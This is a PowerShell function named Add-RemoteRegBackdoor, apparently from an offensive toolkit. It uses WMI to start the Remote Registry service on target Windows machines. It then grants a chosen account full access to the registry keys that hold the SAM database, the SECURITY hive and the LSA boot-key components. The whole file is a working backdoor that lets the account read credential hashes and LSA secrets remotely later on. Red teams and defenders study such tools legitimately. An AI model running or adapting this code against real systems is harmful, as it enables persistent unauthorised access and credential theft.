function Add-RemoteRegBackdoor {

    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Parameter(Position = 1)]
        [Alias('principal', 'user', 'sid')]
        [String]
        $Trustee = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    ForEach ($Computer in $ComputerName) {

        $WmiArguments = @{
            'ComputerName' = $Computer
        }
        if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

        # translate the trustee SID to domain\user, if needed
        $Domain, $User = $Null, $Null
        if ($Trustee -match '^S-1-.*') {
            try {
                $SID = [Security.Principal.SecurityIdentifier]$Trustee
                $UserObj = $SID.Translate([System.Security.Principal.NTAccount])
                if ($UserObj.Value -match '.+\\.+') {
                    $Domain,$User = $UserObj.Value.Split('\\')
                }
                else {
                    $User = $UserObj.Value
                }
            }
            catch {
                Write-Error "[$Computer] Error resolving trustee: $_"
                return
            }
        }
        elseif ($Trustee -match '.+\\.+') {
            $Domain,$User = $Trustee.Split('\\')
        }
        else {
            $User = $Trustee
        }

        if ((-not $User) -or ($User -eq '')) {
            Write-Error "[$Computer] Error resolving trustee '$Trustee'"
            return
        }

        Write-Verbose "[$Computer : $Key] Using trustee username '$User'"
        if ($Domain) {
            Write-Verbose "[$Computer : $Key] Using trustee domain '$Domain'"
        }

        # step 0 -> ensure remote registry is running on the remote system
        try {
            $RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter "name='RemoteRegistry'" @WmiArguments
            if ($RemoteServiceObject.State -ne 'Running') {
                Write-Verbose "[$Computer] Remote registry is not running, attempting to start"
                $Null = $RemoteServiceObject.StartService()
            }
        }
        catch {
            Write-Error "[$Computer] Error interacting with the remote registry service: $_"
            return
        }

        # step 1 -> get a remote registry provider on the system through WMI
        try {
            Write-Verbose "[$Computer] Attaching to remote registry through StdRegProv"
            # Note: we have to use the WMI StdRegProv method as [Microsoft.Win32.RegistryKey] can't be used to set ACL information on remote keys:
            #   https://social.technet.microsoft.com/Forums/windows/en-US/0beee366-ee8d-4052-b1b9-8ad9bf0f8ff0/set-remote-registry-acl-with-powershell-net?forum=winserverpowershell
            $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter "__CLASS = 'StdRegProv'" @WmiArguments
        }
        catch {
            Write-Error "[$Computer] Error attaching to remote registry through StdRegProv"
            return
        }

        $Keys = @(
            'SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg',
            'SYSTEM\CurrentControlSet\Control\Lsa\JD',
            'SYSTEM\CurrentControlSet\Control\Lsa\Skew1',
            'SYSTEM\CurrentControlSet\Control\Lsa\Data',
            'SYSTEM\CurrentControlSet\Control\Lsa\GBG',
            'SECURITY',
            'SAM\SAM\Domains\Account'
        )

        ForEach($Key in $Keys) {

            Write-Verbose "[$Computer : $Key] Backdooring started for key"

            # first grab the existing security descriptor
            #   2147483650 = HKEY_LOCAL_MACHINE
            $RegSD = $Reg.GetSecurityDescriptor(2147483650, $Key).Descriptor

            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
            # 983103 == ALL_ACCESS
            $RegAce.AccessMask = 983103
            # 2 == OBJECT_INHERIT_ACE
            $RegAce.AceFlags = 2
            # 0x0 == 'Access Allowed'
            $RegAce.AceType = 0x0

            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
            $RegTrustee.Name = $User
            if ($Domain) {
                $RegTrustee.Domain = $Domain
            }

            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
            $RegAce.Trustee = $RegTrustee

            # add the new ACE to the retrieved security descriptor
            $RegSD.DACL += $RegAce.PSObject.ImmediateBaseObject

            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
            $Null = $Reg.SetSecurityDescriptor(2147483650, $Key, $RegSD.PSObject.ImmediateBaseObject)

            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
        }

        Write-Verbose "[$Computer] Backdooring completed for system"

        $Out = New-Object PSObject  
        $Out | Add-Member Noteproperty 'ComputerName' $Computer
        $Out | Add-Member Noteproperty 'BackdoorTrustee' $Trustee
        $Out
    }
}

